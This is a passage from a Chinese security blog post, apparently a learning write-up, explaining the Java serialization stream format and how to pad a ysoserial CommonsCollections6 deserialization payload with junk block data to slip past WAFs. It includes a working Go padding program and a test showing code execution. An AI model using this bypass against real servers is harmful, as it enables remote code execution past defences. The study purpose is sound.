java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">contents:<br>  content<br>  contents content<br></code></pre></td></tr></table></figure><p>这里实际上是一个简单的递归下降的规则， contents 可以由一个 content 组成，也可以由一个contents 与一个 content 组成，而后面这种情况里的 contents 又可以继续由这两种情况组成，最后形成编译原理里所谓的左递归。</p><p>我们不用理解这么复杂的内容，因为这个例子非常简单，所以我们很容易地可以理解为： <strong>contents 是有一个或多个content 组成。</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-attribute">content</span>:<br>  <span class="hljs-selector-tag">object</span><br>  blockdata<br></code></pre></td></tr></table></figure><p>content又是由object和blockdata组成</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe">object:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Object</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Class</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Array</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">String</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Enum</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  prevObject<br>  nullReference<span class="hljs-comment">//表示一个null</span><br>  exception<br>  TC_RESET<span class="hljs-comment">//重置Reference ID</span><br></code></pre></td></tr></table></figure><p>要重点区分一下对象<code>newObject</code>,类<code>newClass</code>,类定义<code>newClassDesc</code></p><p>这里对象和类的区别，就是前者是一个类实例化的对象，而后者就是这个类本身</p><p><code>newObject</code>和<code>newClass</code>的Grammer也需好好关注</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">new</span><span class="hljs-type">Class</span>:<br>  TC_CLASS classDesc <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span><br><br>classDesc:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  nullReference<br>  (ClassDesc)prevObject      <span class="hljs-comment">// an object required to be of type</span><br>                             <span class="hljs-comment">// ClassDesc</span><br>                             <br><span class="hljs-keyword">new</span><span class="hljs-type">Object</span>:<br>  TC_OBJECT classDesc <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> classdata[]  <span class="hljs-comment">// data for each class</span><br></code></pre></td></tr></table></figure><p>可见， <code>newObject</code> 和 <code>newClass</code> 都是由一个标示符+ <code>classDesc</code> + <code>newHandle</code> 组成，只不过 <code>newObject</code>多一个 <code>classdata[]</code> 。原因是，它是一个对象，其包含了实例化类中的数据，这些数据就储存在<code>classdata[]</code> 中。</p><p><code>classDesc</code> 就是我们前面说的类定义，不过这个 <code>classDesc</code> 和前面的 <code>newClassDesc</code> 稍微有点区别，<code>classDesc</code> 可以是一个普通的 <code>newClassDesc</code> ，也可以是一个null，也可以是一个指针，指向任意前面已经出现过的其他的类定义。我们只要简单把 <code>classDesc</code> 理解为对 <code>newClassDesc</code> 的一个封装即可</p><p><code>newHandle</code> 是一个唯一ID，序列化协议里的每一个结构都拥有一个ID，这个ID由 0x7E0000 开始，每遇到下一个结构就+1，并设置成这个结构的唯一ID。而我前面说的 <code>prevObject</code> 指针，就是通过这个ID来定位它指向的结构。</p><p><strong>TC_的含义</strong></p><blockquote><p>在上面的代码解释中经常能看见TC_开头的一些参数，他主要是Type Code的缩写，表示一个字节标记的类型</p><p>在Java序列化中，数据流是按照块（Object、Array、Primitive Type）进行分割的。每个块都会以特定的标识符（Type Code）开头，用于标识这个块的类型。常见的Type Code包括：</p><ul><li>TC_OBJECT（对象）</li><li>TC_CLASSDESC（类描述符）</li><li>TC_ARRAY（数组）</li><li>TC_STRING（字符串）</li><li>TC_LONGSTRING（长字符串）</li><li>TC_NULL（null值）</li><li>TC_REFERENCE（引用）</li><li>TC_EXCEPTION（异常）</li><li>TC_BLOCKDATA（数据块）</li><li>TC_ENDBLOCKDATA（数据块结束）</li></ul><p>因此，”TC_”前缀可以让序列化器和反序列化器在处理数据流时快速识别块的类型，以便正确地解析数据。</p></blockquote><h2 id="序列化的解析成果"><a href="#序列化的解析成果" class="headerlink" title="序列化的解析成果"></a>序列化的解析成果</h2><h3 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">protected</span> String name;<br>    <span class="hljs-keyword">protected</span>  User parent;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParent</span><span class="hljs-params">(User parent)</span><br>    &#123;<br>        <span class="hljs-built_in">this</span>.parent=parent;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">bob</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;bob&quot;</span>);<br>        bob.setParent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;Josa&quot;</span>));<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(bob);<br>        System.out.println(Base64.encodeBase64String(byteArrayOutputStream.toByteArray()));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">//输出</span><br>r<span class="hljs-meta">O0</span>ABX<span class="hljs-symbol">NyABd5</span>c<span class="hljs-number">29</span>zZXJpYWwucHJhY<span class="hljs-number">3</span>RpY<span class="hljs-number">2</span>UuVX<span class="hljs-symbol">NlcpHNaOa2</span><span class="hljs-symbol">n6</span><span class="hljs-name">m0</span>AgACTAAEbmFtZXQAEkxqYXZhL<span class="hljs-number">2</span>xhbmcvU<span class="hljs-number">3</span>RyaW<span class="hljs-number">5</span><span class="hljs-symbol">nO0</span>wAB<span class="hljs-symbol">nBhcmVudHQAGUx5</span>c<span class="hljs-number">29</span>zZXJpYWw<span class="hljs-attr">vcHJhY3</span>RpY<span class="hljs-number">2</span>UvVX<span class="hljs-symbol">Nlcjt4</span>cHQAA<span class="hljs-number">2</span>JvY<span class="hljs-symbol">nNxAH4</span>AAHQABEp<span class="hljs-attr">vc2</span>Fw<br></code></pre></td></tr></table></figure><p>将得到的Base64的数据流用zkar进行分析，这里还是用p神那张图</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230223224253392.png" alt="image-20230223224253392"> </p><p>可见，这里 contents 只包含一个 newObject ，其第一部分是 ClassDesc ，包含了User这个类的信息，比如类名、SerialVersionUID、父类、属性列表等。</p><p>这个 classDesc 的ID，也就是handler为8257536，而在 []classData 数组中，包含两个属性， name 和 parent ，parent 也是一个 newObject ，它实际上在源码中是一个User类对象，所以 classDesc 也是User类的信息，因为前面已经定义过了，所以这个类是一个Reference，ID也是8257536，表示指向前面User类的ClassDesc。</p><p>通过这个简单的案例，我们可以理解Java是怎么序列化一个类的。当然，实际情况会比这个例子要复杂很多，但我们只需要按照Grammer中的语法进行分析，再结合zkar的执行结果，即可很好地理解序列化协议了</p><h3 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">AuthClass</span> <span class="hljs-variable">authClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AuthClass</span>(<span class="hljs-string">&quot;123456&quot;</span>);<br>  <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./authClass.bin&quot;</span>));<br>  oos.writeObject(authClass);<br>  oos.writeObject(authClass);<br>  oos.close();<br></code></pre></td></tr></table></figure><p>将同一个对象执行两次writeObject，序列化数据经过SerializationDumper处理如下，其中new_handle的值是SerializationDumper标注出的，实际并不存在。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414183955883.png" alt="image-20230414183955883"> </p><p>序列化的内容如下：</p><ul><li><p>STREAM_MAGIC 数据头 0xaced</p></li><li><p>STREAM_VERSION 序列化数据版本呢 0x0005</p></li><li><p>TC_OBJECT 0x73 表示接下来的序列化数据是一个object，用0x73表示，除了Object，还有TC_REFERENCE、TC_STRING等，分别表示接下来不同的数据类型，对应不同的处理方法。</p><ul><li>TC_CLASSDESC 0x72类的描述符 标识接下来是类的一些属性以及信息等等信息<ul><li>Length 0x00 30 类名长度</li><li>Value 0x79736f73657269616c2e7061796c6f6164732e7765626c6f6769635f686967682e74657374243141757468436c617373 类名</li><li>serialVersionUID 0x00 00 00 00 00 00 00 64序列化数据ID</li><li>newHandle 0x00 7e 00 00 这个是SerializationDumper手动添加的，实际的序列化数据中不存在这个值，便于后续计算REFERENCE</li><li>classDescFlags 0x02 类描述符标记，一个单位标记符</li><li>fieldCount 0x0001 对象的成员属性的数量</li><li>Fields 对象的成员属性(包含了属性名及属性类型)<ul><li>Object 0x4c 标识成员类的种类，除了L(0x4c)还有B(Byte)、C(char)等。</li><li>Length 0x0008 成员名长度</li><li>Value 0x70617373776f7264 成员名</li><li>TC_STRING 0x74成员类型<ul><li>newHandle 0x00 7e 00 01 第二个handle</li><li>Length 0x00 12 长度</li><li>Value 0x4c6a6176612f6c616e672f537472696e673b</li></ul></li></ul></li><li>TC_ENDBLOCKDATA 0x78 标识一个类结束</li><li>superClassDesc 0x70父类的类描述</li></ul></li><li>classdata 类的成员变量的值<ul><li>TC_STRING 0x74 字符串类型</li><li>newHandle 0x00 7e 00 03 值对应的handle</li><li>Value 0x313233343536 成员变量的值</li></ul></li><li>TC_REFERENCE 0x71 第二个对象，是个reference类型<ul><li>Handle 0x00 7e 00 02 handle的地址</li></ul></li></ul></li></ul><p>一共出现了4个handle，用readObject读取这四个handle标识的对象</p><p>0x007e0000 ysoserial.payloads.weblogic_high.test$1AuthClass.class 的ObjectStreamClass对象，对应TC_CLASSDESC的内容</p><p>0x007e0001 char[]对象，标识成员属性（password）的类型</p><p>0x007e0002 ysoserial.payloads.weblogic_high.test$1AuthClass.class对象</p><p>0x007e0003 ysoserial.payloads.weblogic_high.test$1AuthClass.passsword的值</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414221257829.png" alt="image-20230414221257829"> </p><p>通过reference，可以实现在readObject时，反序列化任意已经序列化过的对象，以及它们的一些字段。</p><h2 id="构造包含垃圾的序列化流"><a href="#构造包含垃圾的序列化流" class="headerlink" title="构造包含垃圾的序列化流"></a>构造包含垃圾的序列化流</h2><h3 id="C0ny"><a href="#C0ny" class="headerlink" title="C0ny"></a>C0ny</h3><p>先来看看c0ny师傅的大体思路</p><p>思路是需要找到一个class可以序列化，它可以把我们的脏数据对象和ysoserial gadget对象一起包裹起来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class A&#123;<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">10000</span>]&#123;<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12.</span>....&#125;<br>.....<br>yso Gadget<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们要找的class，第一需要实现java.io.Serializable接口，第二可以存储任意对象。这么看来集合类型就非常符合我们的需求。</p><ol><li><p>ArrayList</p></li><li><p>LinkedList</p></li><li><p>HashMap</p></li></ol><p>…..</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230223230550344.png" alt="image-20230223230550344"> </p><p>所以我们可以改造ysoserial</p><p>大致的流程调用是，构造函数传入gadget对象以及垃圾数据长度，然后调用doWrap方法随机创建一个集合类型把随机生成的脏数据和gadget对象存储起来，最终序列化该对象即可拿到bypass WAF的序列化数据。具体实现参考<a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">代码和注释</a></p><p>完整的项目看这个</p><p><a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据 (qq.com)</a></p><h3 id="P"><a href="#P" class="headerlink" title="P"></a>P</h3><p>c0ny师傅的大体思路就是把Gadget和脏数据一起放入一个集合对象中</p><p>但是还有其他的操作</p><p>content是由object和blockdata组成，而blockdata是一个适合用来填充脏数据的地方</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino">content:<br>    object<br>    blockdata<br><br>blockdata:<br>    blockdatashort<br>    blockdatalong<br><br>blockdatashort:<br>    <span class="hljs-built_in">TC_BLOCKDATA</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">byte</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br><br>blockdatalong:<br>    <span class="hljs-built_in">TC_BLOCKDATALONG</span> (<span class="hljs-type">int</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br></code></pre></td></tr></table></figure><p>可见，blockdata有两种可能性，blockdatashort，顾名思义，前面可以保存的数据较少</p><p>我们选择<code>blockdatalong</code></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">blockdatalong:<br><span class="hljs-built_in">TC_BLOCKDATALONG</span> (<span class="hljs-type">int</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br></code></pre></td></tr></table></figure><p>结构分为三部分</p><ul><li><code>TC_BLOCKDATALONG</code> 标示符</li><li><code>(int)&lt;size&gt;</code> 数据长度，是一个4字节的整型</li><li><code>(byte)[size]</code> 数据具体的内容</li></ul><p>找到我们的CC6利用链，加入下列代码使得其成功写出序列化文件cc6.ser</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;cc6.ser&quot;</span>);<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);<br>objectOutputStream.writeObject(expMap);<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414093749138.png" alt="image-20230414093749138"> </p><p>我们编写一个简单的Go程序，并调用zkar库中的结构和方法，来构造这个填充了垃圾字符的CommonsCollections6的Payload：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/phith0n/zkar/serz&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 从文件中读取字节数据</span><br>data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;D:\\Code_Project\\Java\\ysoserial-master\\cc6.ser&quot;</span>)<br><span class="hljs-comment">// 将字节数据转换为序列化对象</span><br>serialization, err := serz.FromBytes(data)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(<span class="hljs-string">&quot;parse error&quot;</span>)<br>&#125;<br><span class="hljs-comment">// 创建一个新的序列化内容，包含一个长数据块</span><br><span class="hljs-keyword">var</span> blockData = &amp;serz.TCContent&#123;<br>Flag: serz.JAVA_TC_BLOCKDATALONG, <span class="hljs-comment">//</span><br>BlockData: &amp;serz.TCBlockData&#123;<br>Data: []<span class="hljs-type">byte</span>(strings.Repeat(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">40000</span>)),<br>&#125;,<br>&#125;<br><span class="hljs-comment">// 将新的内容追加到序列化对象中</span><br>serialization.Contents = <span class="hljs-built_in">append</span>(serialization.Contents, blockData)<br><span class="hljs-comment">// 将序列化对象转换为字节数据并写入文件</span><br>ioutil.WriteFile(<span class="hljs-string">&quot;cc6-padding.ser&quot;</span>, serialization.ToBytes(), <span class="hljs-number">0</span>o755)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>填充了一个payload，内容如下</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414093914002.png" alt="image-20230414093914002"> </p><p>使用Java代码加载我们的修改后的ser文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleRead</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;D:\\Code_Project\\Go\\zkar-master\\cc6-padding.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        System.out.println(o);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>能够成功弹出计算器</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414093847402.png" alt="image-20230414093847402"> </p><p>但如此的填充很有缺陷，填充的数据在Payload后面，WAF一旦检查数据包的前N个字符，仍无法绕过，所以我们思考将垃圾字符放在Payload前面</p><p>我们原来的顺序是这样的，<code>content</code>在前，<code>blockdata</code>在后</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">serialization.Contents = <span class="hljs-built_in">append</span>(serialization.Contents, blockData)<br></code></pre></td></tr></table></figure><p>我们改为这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">serialization.Contents = append([]*serz.TCContent&#123;blockData&#125;,<br>serialization.Contents...)<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414101213128.png" alt="image-20230414101213128"> </p><p>发现也能够成功的弹出我们的计算器，可是P神说存在问题，可是我这里尝试不到任何的问题，挖个坑</p><h2 id="序列化中的handler"><a href="#序列化中的handler" class="headerlink" title="序列化中的handler"></a>序列化中的handler</h2><p><strong>引用机制</strong></p><p>在序列化流程中，对象所属类、对象成员属性等数据都会被使用固定的语法写入到序列化数据，并且会被特定的方法读取；在序列化数据中，存在的对象有null、new objects、classes、arrays、strings、back references等，这些对象在序列化结构中都有对应的描述信息，并且每一个写入字节流的对象都会被赋予引用<code>Handle</code>，并且这个引用<code>Handle</code>可以反向引用该对象（使用<code>TC_REFERENCE</code>结构，引用前面handle的值），引用<code>Handle</code>会从<code>0x7E0000</code>开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用Handle会重新从<code>0x7E0000</code>开始。</p><p><strong>成员抛弃</strong></p><p>在反序列化中，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值，<strong>如果这个值出现在字节流中，但是并不属于对象，则抛弃该值，但是如果这个值是一个对象的话，那么会为这个值分配一个 Handle。</strong></p><p>接下来我们看看Handler的重要概念，先用下面的demo查看handler的具体场景</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test.Others;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><span class="hljs-keyword">import</span> ysoserial.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String Name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name)</span> &#123;<br>        Name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;bridge&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(student, student);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">b64</span> <span class="hljs-operator">=</span> Base64.encodeBase64String(Serializer.serialize(map));<br>        System.out.println(b64);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用idea生成base64以后再用zkar分析序列化字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump --base64 rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAGnlzb3NlcmlhbC5wcmFjdGljZS5TdHVkZW50x8a8lWlJOVECAAFMAAROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7eHB0AAZicmlkZ2VxAH4ABHg=<br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">17</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">11</span><br>        <span class="hljs-meta">@Value</span> - java.util.HashMap - <span class="hljs-number">0x6a</span> <span class="hljs-number">61</span> <span class="hljs-number">76</span> <span class="hljs-number">61</span> 2e <span class="hljs-number">75</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> 6c 2e <span class="hljs-number">48</span> <span class="hljs-number">61</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">4d</span> 